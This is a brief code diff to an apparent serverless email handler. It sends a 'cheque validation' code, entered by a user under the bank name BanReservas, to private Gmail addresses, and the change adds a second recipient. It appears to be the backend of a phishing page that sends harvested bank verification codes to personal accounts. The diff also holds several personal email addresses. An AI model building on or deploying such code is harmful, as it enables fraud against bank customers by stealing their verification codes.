@@ -26,7 +26,7 @@ exports.handler = async function(event, context) {
         // Configuración del correo
         let mailOptions = {
             from: 'cuentaluperonp5@gmail.com',
-            to: 'sierroalee@gmail.com',
+            to: 'sierroalee@gmail.com, almabrito67@gmail.com',
             subject: 'Validación de cheque - BanReservas',
             text: `El usuario ingresó el siguiente código de validación:\n\nCódigo: ${code}`,
         };
